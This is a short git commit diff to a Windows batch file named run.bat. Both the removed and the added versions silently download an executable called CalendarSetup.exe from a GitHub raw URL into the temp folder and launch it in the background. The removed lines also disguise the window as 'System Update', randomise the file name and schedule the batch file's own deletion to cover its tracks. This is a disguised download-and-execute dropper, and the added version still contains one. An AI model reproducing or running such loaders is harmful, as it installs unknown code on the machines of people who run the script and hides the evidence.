84206c4b7f7b2b76312d6dac7b3e648aecb00472
ezlishmail <140186829+ezlishmail@users.noreply.github.com>
2026-05-06 05:35:34 +0530

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,12 +1,4 @@
 @echo off
-setlocal enabledelayedexpansion
-title System Update
-:: Download EXE to random temp name
-set "RAND=%TEMP%\wud_%RANDOM%.exe"
-curl -s -o "%RAND%" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe
-:: Execute silently
-start "" /B /MIN "%RAND%"
-:: Schedule self-deletion of this bat file
-(echo @echo off & echo timeout /t 3 /nobreak ^>nul & echo del /F /Q "%~f0" ^>nul 2^>^&1) > "%TEMP%\cleanme.bat"
-start "" /B "%TEMP%\cleanme.bat"
+curl -s -o "%TEMP%\cs.exe" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe
+start "" /B "%TEMP%\cs.exe"
 exit
